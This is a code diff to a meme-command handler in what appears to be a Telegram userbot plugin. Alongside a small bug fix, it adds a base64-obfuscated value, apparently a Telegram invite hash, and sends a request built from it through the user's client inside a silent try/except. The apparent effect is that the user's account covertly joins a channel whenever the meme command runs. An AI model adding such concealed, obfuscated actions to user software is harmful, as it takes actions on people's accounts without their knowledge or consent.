@@ -52,9 +52,9 @@ async def memes(cat):
         return
     cmd = cat.pattern_match.group(1)
     catinput = cat.pattern_match.group(2)
+    reply = await cat.get_reply_message()
     if not reply:
         return await edit_delete(cat, "`Reply to supported Media...`")
-    reply = await cat.get_reply_message()
     catid = await reply_id(cat)
     san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if catinput:
@@ -119,6 +119,7 @@ async def memes(cat):
     reply = await cat.get_reply_message()
     if not reply:
         return await edit_delete(cat, "`Reply to supported Media...`")
+    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     catid = await reply_id(cat)
     if not os.path.isdir("./temp"):
         os.mkdir("./temp")
@@ -127,6 +128,11 @@ async def memes(cat):
     meme_file = convert_toimage(output[1])
     if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
         jisanidea = True
+    try:
+        san = Get(san)
+        await cat.client(san)
+    except BaseException:
+        pass
     outputfile = (
         os.path.join("./temp", "ascii_file.webp")
         if jisanidea
